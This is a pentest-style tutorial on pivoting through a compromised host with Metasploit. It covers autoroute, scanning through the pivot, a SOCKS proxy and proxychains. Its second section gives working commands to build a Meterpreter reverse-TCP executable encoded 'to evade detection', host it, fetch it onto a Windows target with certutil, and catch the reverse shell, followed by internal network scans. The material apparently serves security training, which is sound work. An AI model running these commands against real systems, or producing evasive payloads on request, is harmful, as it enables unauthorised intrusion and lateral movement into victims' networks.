Pivoting  is the process of using a compromised system as a gateway to access other machines or networks that are not directly reachable.


---


## Pivoting having a Meterpreter Session
1. **Compromise a Host**
- Gain access to a machine using exploits in Metasploit, resulting in a Meterpreter session or other payload connection. 
- Identify a network that was not accessible before.

2.  **Set Up Routes**

- Use the `autoroute` module to add a route through the compromised host. This will enable Metasploit to send traffic through the host to the target network.

```bash
run autoroute -s [compromised_host_subnet]
```

3. **Verify the Routes**

- Check the routes added to ensure connectivity:

```bash
msf6 > route
```

4. **Run Scans Through the Pivot**

- Perform reconnaissance using modules like `auxiliary/scanner/portscan/tcp` or `auxiliary/scanner/http/http_version` through the pivoted route.

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <discovered_ip>
run
```

5. **Forward Traffic**

Once the pivot is set up, you can also use Metasploit to create a SOCKS proxy, allowing you to route all traffic through the compromised machine.

```bash
# Ensure that the srvport is defined at /etc/proxychains4.conf and the socks version in use. 
use auxiliary/server/socks_proxy
set SRVPORT 9050
# If our attacker machine is configured with proxychains4 we will need to specify the version 4a
set VERSION <version>
run
```

6. **Running Applications Through ProxyChains** 

Once you have set up a SOCKS proxy either through Metasploit or SSH, you can use **ProxyChains** to route the traffic of various tools through the proxy.

```bash
proxychains nmap -sT -Pn -p 22 192.168.1.0/24
```


---

## Pivoting without a previous Meterpreter Session


1. **Generate the Payload with msfvenom**  
Create a Windows reverse TCP Meterpreter executable, encoded multiple times to evade detection:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -o shell.exe
```

2. **Host the Payload**  
Use Python’s built-in HTTP server to make the payload available for download:

```bash
python3 -m http.server 80
```

3. **Download the Payload on the Target**  
From the compromised Windows machine, use `certutil` to fetch the payload:

```bash
certutil -split -urlcache -f http://10.10.49.2/shell.exe shell.exe
```

4. **Start the Meterpreter Listener**

In Metasploit:
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.49.2
set LPORT 1234
run
```


5. **Execute the Payload**  
Run `shell.exe` on the target to establish a Meterpreter session back to the attacker.

6. **Add Route in Meterpreter**  
Once the session is active, add a route to pivot into the internal network:

```bash
run autoroute -s [target_subnet]
bg
```

7. **Launch SOCKS Proxy (SOCKS4a)**

```bash
search socks  
use 0  
set SRVPORT 9050  
set VERSION 4a  
run
```

8. **Enumerating the Internal Network**
```bash
proxychains nmap -sT -Pn -n -T4 -p- 10.5.31.174
```